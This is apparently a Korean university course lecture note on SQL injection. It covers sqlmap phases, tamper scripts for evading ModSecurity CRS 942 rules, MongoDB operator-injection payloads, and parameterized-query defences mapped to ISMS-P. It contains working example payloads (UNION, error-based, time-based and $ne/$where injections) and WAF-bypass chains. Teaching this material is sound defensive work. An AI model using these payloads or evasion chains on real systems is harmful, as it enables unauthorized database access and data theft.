# W04 — A03 Injection (SQLi 심화) — sqlmap + tamper + ModSec 942 우회

> **본 주차의 한 줄 요약**
>
> OWASP A03 (Injection) 의 *대표 — SQLi* 심화. sqlmap 의 4 phase + 10 tamper +
> ModSec CRS 942 family 의 *우회 매트릭스* + AdminConsole (Flask) 의 *SQL vs
> NoSQL 식별* + 수동 5 payload 의 *직접 분석*. 본 주차 가 *침투 측 + 방어 측*
> 동시 hands-on.
>
> **운영자 한 줄 결론**: SQLi 는 *모든 web vuln 의 영향 1 위*. *DB 의 모든 데이터
> 노출* 가능. *parameterized query* + *ORM* + *WAF* 의 *3 축 방어* 필수.

---

## 학습 목표

본 주차 종료 시 학생은 다음 7 가지 를 **본인 손으로** 할 수 있어야 한다.

1. SQLi 의 *5 카테고리* (UNION / Boolean / Error / Time / OR 1=1) + 각 의 *payload
   특징* 30 초 응답.
2. sqlmap 의 *4 phase* (detection / fingerprint / injection / dump) + *각 phase 의
   결과* 인지.
3. 10 tamper script 중 *대표 5* (space2comment / randomcase / between /
   charunicodeescape / apostrophenullencode) 의 *변형 메커니즘*.
4. ModSec CRS 942 family 의 *주요 룰* (942100 SQLi / 942130 URL encoded / 942150
   union) 인지.
5. SQL vs NoSQL injection 의 *문법 차이* + 식별 방법.
6. *parameterized query* + *ORM* 의 *방어 표준* + 한국 ISMS-P 2.6 매핑.
7. W04 보고서 작성 (4 finding + CVSS + CWE + ATT&CK T1190).

---

## 강의 시간 배분 (3시간 40분)

| 차시 | 주제 | 시간 |
|:----:|------|------|
| 1차시 | SQLi 5 카테고리 + sqlmap 4 phase | 60 분 |
| 2차시 | 10 tamper script + ModSec 942 우회 | 60 분 |
| 3차시 | NoSQL injection + Flask SQLAlchemy / pymongo | 50 분 |
| 4차시 | 방어 표준 + 보고서 + W05 (XSS) 예고 | 30 분 |
| 휴식 | 차시 사이 + 마지막 | 20 분 |

---

## 1차시 — SQLi 5 카테고리 + sqlmap 4 phase

### 1-1. SQLi 의 *영향* — 왜 1 위 인가

OWASP 2021 의 A03 = *Injection* (전체 #3). 단 *영향 면적* 으로 *1 위* — *DB 의 모든
데이터* 의 *임의 조회 / 수정 / 삭제* 가능.

**한국 사고 사례** (2023):
- 대학교 학적 시스템 의 SQLi → 학생 5 만 명 의 *주민등록번호 + 이름 + 주소* 유출
- payload: `1' OR '1'='1` 의 *단순 형*
- 정정: 즉시 *parameterized query* 적용 + WAF 도입
- 비용: 과징금 5 천만원 + 명예 손실

### 1-2. SQLi 의 *5 카테고리*

**카테고리 1 — Classic (OR 1=1)**

가장 단순. `username='admin' AND password='X'` 의 `password='X' OR '1'='1` 로 변조.

```sql
SELECT * FROM users WHERE username='admin' AND password='X' OR '1'='1';
                                                              ↑
                                                       항상 true → 인증 우회
```

방어: parameterized query + input validation.

**카테고리 2 — UNION-based**

`SELECT id, name FROM products WHERE id=1` 의 `id=1 UNION SELECT user,password FROM users--` 로 *다른 table* 조회.

```sql
SELECT id, name FROM products WHERE id=1
UNION SELECT user, password FROM users--;
       ↑
   column 수 일치 필수 + UNION ALL 도 가능
```

**핵심** = column 수 + type 일치 (NULL 로 padding 가능).

**카테고리 3 — Boolean-based BLIND**

응답 의 *true/false 차이* 로 *정보 추출*.

```sql
?id=1 AND 1=1   ← 응답 200 + 정상 결과
?id=1 AND 1=2   ← 응답 200 + 빈 결과 (또는 400)
```

차이 가 *information leak*. *분 단위* 의 brute (각 char 의 *binary search*).

**카테고리 4 — Error-based**

DB error message 의 *정보 노출* 악용. MySQL 의 `EXTRACTVALUE` / `UPDATEXML` / `EXP`
등.

```sql
?id=1' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT version())))--
                                          ↑
                                  error message 에 MySQL version 노출
```

방어: DB error 의 *user 노출 X* — generic message 만.

**카테고리 5 — Time-based BLIND**

응답 의 *시간 차이* 로 *information leak*. error / response body 없이 도 가능.

```sql
?id=1' AND IF(1=1, SLEEP(5), 0)--   ← 5초 지연 = true
?id=1' AND IF(1=2, SLEEP(5), 0)--   ← 즉시 응답 = false
```

WAF 가 *response body* 만 검사 → time-based 의 *완전 회피* 가능.

### 1-3. sqlmap 의 *4 phase*

sqlmap (2006-, Bernardo Damele) = *de facto* SQLi 자동 도구.

**Phase 1 — Detection** (10-60 초):
```
[*] testing 'AND/OR boolean-based blind'
[*] testing 'UNION query - 1 to 10 columns'
[*] testing 'time-based blind'
[*] testing 'error-based'
[*] testing 'stacked queries'
```

각 카테고리 의 *payload 자동 시도* → vulnerable parameter + technique 결정.

**Phase 2 — Fingerprint** (1-5 초):
```
back-end DBMS: MySQL >= 5.0.12
DBMS version: 8.0.31
```

DBMS 종류 + version 결정. 이후 phase 의 *DBMS-specific payload* 사용.

**Phase 3 — Injection** (수 분):
```
Parameter: id (GET)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: id=1' AND 1=1--
```

vulnerable parameter + 정확 payload 확정.

**Phase 4 — Dump** (수 분 - 수 시간):
```
[*] dumping table 'users' entries
+----+-------+----------+
| id | user  | password |
+----+-------+----------+
| 1  | admin | $2y$12...|
| ...
```

DB / table / column / row 의 *실 데이터* 추출.

### 1-4. sqlmap 의 *주요 옵션*

| 옵션 | 의미 |
|------|------|
| `--batch` | 모든 prompt 자동 default (학습 환경 만) |
| `--level=1-5` | payload *정밀도* (높을 수록 시간 + 오탐) |
| `--risk=1-3` | DB *위험* (DROP TABLE 등 — 학습 환경 만 high) |
| `--tamper=x,y` | 복수 tamper 의 chained |
| `--dbms=mysql` | fingerprint 의 *hint* |
| `--random-agent` | UA 변조 (ModSec UA 차단 우회) |
| `--time-sec=5` | time-based 의 *delay 임계* |
| `--threads=1-10` | 병렬 (높을 수록 빠름 + WAF 발견 가능) |
| `--proxy=http://...` | Burp 통합 가능 |
| `--cookie=...` | login 후 token 의 인증 |

---

## 2차시 — 10 tamper script + ModSec 942 우회

### 2-1. tamper 의 *역할*

sqlmap 의 *payload 변형 모듈*. *동일 의도* 의 *다른 형식* — WAF 의 *정규식* 우회.

**10 대표 tamper**:

| # | tamper | 변형 메커니즘 |
|:-:|--------|-------------|
| 1 | `space2comment` | space → `/**/` |
| 2 | `space2plus` | space → `+` |
| 3 | `space2randomblank` | space → 임의 whitespace |
| 4 | `randomcase` | SELECT → SeLeCt |
| 5 | `between` | `=` → `BETWEEN .. AND ..` |
| 6 | `equaltolike` | `=` → `LIKE` |
| 7 | `apostrophenullencode` | `'` → `%00%27` |
| 8 | `charunicodeescape` | char → `\u00XX` |
| 9 | `concat2concatws` | CONCAT → CONCAT_WS |
| 10 | `unionalltounion` | UNION ALL → UNION |

### 2-2. tamper 의 *chained*

`--tamper=space2comment,randomcase,between` 의 *동시 적용*. 한 payload 가 *3 변형*
모두 거침.

```sql
-- 원본
UNION SELECT 1,2,3 FROM users--

-- space2comment → randomcase → between 적용
UNION/**/SeLeCt/**/1,2,3/**/FROM/**/users--

-- 추가 between (= → BETWEEN)
UNION/**/SeLeCt/**/1,2,3/**/FROM/**/USerS/**/WHERE/**/id/**/BETWEEN/**/0/**/AND/**/2--
```

### 2-3. ModSec CRS 942 family 의 *주요 룰*

942 family = SQLi 차단. *15+ 룰* 의 *각 패턴*.

| Rule ID | 패턴 |
|:-------:|------|
| 942100 | libinjection (token-based, *모든 SQLi* 의 합성) |
| 942120 | injection 의 *동등 사용* (`=` / `<>` / `!=`) |
| 942130 | URL encoded SQLi |
| 942140 | common DB names (`mysql.user`, `information_schema`) |
| 942150 | UNION SELECT |
| 942160 | sleep / benchmark / waitfor (time-based) |
| 942170 | SQL hex encoded |
| 942180 | SQL injection 의 ascii encoded |
| 942190 | MSSQL code execution + IP enumeration |
| 942200 | ProSec custom signatures |
| 942210 | chained SQL injection 시도 (stacked) |
| 942220 | wide / overlong UTF-8 |
| 942230 | MSSQL UTL_HTTP requests |
| 942240 | DB shutdown 시도 |
| 942250 | MATCH AGAINST / MERGE / EXECUTE IMMEDIATE |

### 2-4. libinjection vs regex — *차이*

**regex 기반** (942120, 942150 등) — *패턴 매칭*. tamper 의 *variant* 우회 가능.

**libinjection** (942100) — *SQL token 의 분석*. `' OR '1'='1` 의 *token 구조* 인식
— *변형 무관* 차단.

```c
// libinjection 의 token 분석
input: "1' OR '1'='1"
tokens: [NUMBER(1), STRING("'"), OPERATOR(OR), STRING("'"), NUMBER(1), OPERATOR(=), STRING("'"), NUMBER(1)]
fingerprint: "ns&son"  // 의심 패턴
```

→ libinjection 의 *우회 어려움* — *별 의 sqlmap tamper* 가 *대부분 실패*.

### 2-5. ModSec paranoia 의 *trade-off*

paranoia level ↑ → SQLi 차단 ↑ + false positive ↑.

| paranoia | SQLi 차단 | False Positive (정상 검색) |
|:--------:|---------:|---------------------------:|
| 1 (default) | 85% | < 1% |
| 2 | 95% | 3-5% |
| 3 | 99% | 10-20% |
| 4 | 99.5% | 30-50% |

**production** = paranoia 1 + exclusion (특정 URL 의 *false positive* 제거). paranoia
4 = false positive 의 *모든 검색 차단* 위험.

---

## 3차시 — NoSQL injection + Flask SQLAlchemy / pymongo

### 3-1. NoSQL 의 *부상*

modern stack 의 *RDBMS 외* 사용 증가:
- MongoDB (document) — JuiceShop / AdminConsole
- Redis (key-value) — cache / session
- Cassandra / DynamoDB (wide column) — big data
- GraphQL (query language) — modern API

각 *injection 패턴* 이 *SQL 과 다름*. sqlmap *비지원*.

### 3-2. MongoDB injection 의 *표준 payload*

MongoDB 의 *JSON query* 가 *공격 면*.

**payload 1 — `$ne` (not equal)**:
```json
{"username": {"$ne": null}, "password": {"$ne": null}}
```
*모든 user* 매칭 (null 외 = 모든 값) → 첫 user 의 *인증 통과*.

**payload 2 — `$gt` / `$lt`**:
```json
{"username": "admin", "password": {"$gt": ""}}
```
*"admin" + 모든 비밀번호 (empty 외)* 매칭.

**payload 3 — `$where` (JavaScript 실행)**:
```json
{"$where": "this.username == 'admin' || true"}
```
*server-side JavaScript* 실행 — RCE 가능.

**payload 4 — `$regex`**:
```json
{"username": "admin", "password": {"$regex": ".*"}}
```
*정규식 매칭* — 모든 string.

### 3-3. Flask 의 *2 패턴* — SQLAlchemy vs pymongo

**SQLAlchemy (RDBMS, SQL)**:
```python
from flask_sqlalchemy import SQLAlchemy
db = SQLAlchemy(app)

# SAFE — parameterized
user = User.query.filter_by(username=username).first()

# VULN — raw SQL
db.session.execute(f"SELECT * FROM users WHERE username='{username}'")
```

**pymongo (MongoDB)**:
```python
from pymongo import MongoClient
db = MongoClient()['mydb']

# SAFE — type 검증
if not isinstance(username, str):
    raise ValueError("username must be str")
user = db.users.find_one({"username": username})

# VULN — type 검증 없음
user = db.users.find_one(request.json)  # {"$ne": null} 직접 전달
```

### 3-4. 방어 표준

**SQL 방어**:
1. **parameterized query** — `?` placeholder
2. **ORM** — SQLAlchemy / Django ORM
3. **input validation** — *type + 형식* 검증
4. **WAF** — ModSec CRS 942
5. **least privilege DB user** — SELECT only, DROP X

**NoSQL 방어**:
1. **type 강제** — `if not isinstance(x, str)` 사전 검증
2. **JSON schema** — `jsonschema.validate(data, schema)`
3. **operator whitelist** — `$ne / $gt / $where` 사용 시 *명시 적 거부*
4. **mongo sanitize lib** — `mongoengine` 의 *clean*

---

## 4차시 — 방어 표준 + 보고서 + W05 예고

### 4-1. 한국 ISMS-P 매핑

- **ISMS-P 2.6.1 (네트워크 접근)** — WAF 적용 의무
- **ISMS-P 2.6.4 (데이터베이스 접근통제)** — DB user 의 권한 분리
- **ISMS-P 2.7.1 (암호정책)** — DB 의 sensitive data 암호화
- **ISMS-P 2.9.1 (보안 모니터링)** — WAF 의 audit log 보존

본 W04 의 *vuln 4 영역* 가 *ISMS-P 4 통제 의 동시 위반* 가능.

### 4-2. W04 보고서 의 *3 청자 만족*

**임원** — vuln 의 *법 적 책임* (개인정보보호법 의 *과징금 5천만원*)
**운영자** — *즉시 패치* (parameterized query 의 1 라인 변경)
**분석가** — *근본 원인* (input validation 부재 + WAF 의 paranoia 1 의 한계)

### 4-3. W05 예고

**W05 — A03 Injection (XSS)**. JuiceShop + MediForum 의 XSS 5 변형 + ModSec 941
+ DOM XSS.

- lecture: XSS 3 종 (Stored / Reflected / DOM) + CSP + DOMPurify
- lab 5 step: JuiceShop search XSS + MediForum 댓글 XSS + 5 변형 매트릭스 + CSP 우회 + 보고서

---

## 본 주차 정리

본 W04 을 마치면 학생 은:

1. ✅ SQLi 5 카테고리 + sqlmap 4 phase 인지
2. ✅ 10 tamper script + ModSec 942 우회 매트릭스
3. ✅ NoSQL injection 패턴 + Flask 의 SQLAlchemy vs pymongo
4. ✅ parameterized query + ORM + WAF 의 3 축 방어
5. ✅ W04 보고서 작성 + 한국 ISMS-P 매핑

---

## 자기 점검

```
[ ] SQLi 5 카테고리 + 각 payload 예 응답?
[ ] sqlmap 4 phase + 각 phase 의 *결과* 응답?
[ ] 10 tamper 중 *5 대표* + 변형 메커니즘 응답?
[ ] libinjection vs regex 의 *차이* + 우회 가능성 응답?
[ ] NoSQL injection 의 *4 payload* + 방어 응답?
[ ] 한국 ISMS-P 의 *4 통제* + 본 vuln 의 *위반 매핑* 응답?
```

---

## 다음 주차 — W05

**W05 — A03 Injection (XSS 심화)**. JuiceShop + MediForum 의 XSS 5 변형 + ModSec
941 + DOM XSS + CSP 우회.

- 예상 시간: 10 시간 (lecture 3 + lab 7)
